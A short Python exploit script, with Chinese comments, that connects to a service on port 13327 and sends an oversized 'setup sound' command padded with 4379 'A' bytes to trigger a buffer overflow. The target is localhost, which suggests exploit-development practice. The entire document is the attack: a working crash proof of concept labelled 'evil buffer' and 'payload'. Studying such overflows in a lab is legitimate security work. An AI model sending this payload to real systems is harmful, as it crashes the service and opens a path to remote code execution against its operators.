import socket
host = "127.0.0.1"
crash = "\x41" * 4379  #\x41是ASCII码代表"A" 4379是判断多少个字符能使程序发生缓冲区溢出
buffer = "\x11(setup sound" + crash + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*]Sending evil buffer...")
s.connect((host, 13327))   #host后面是连接的端口号
data = s.recv(1024)
print(data)
s.send(buffer)
s.close()
print("[*]Payload sent")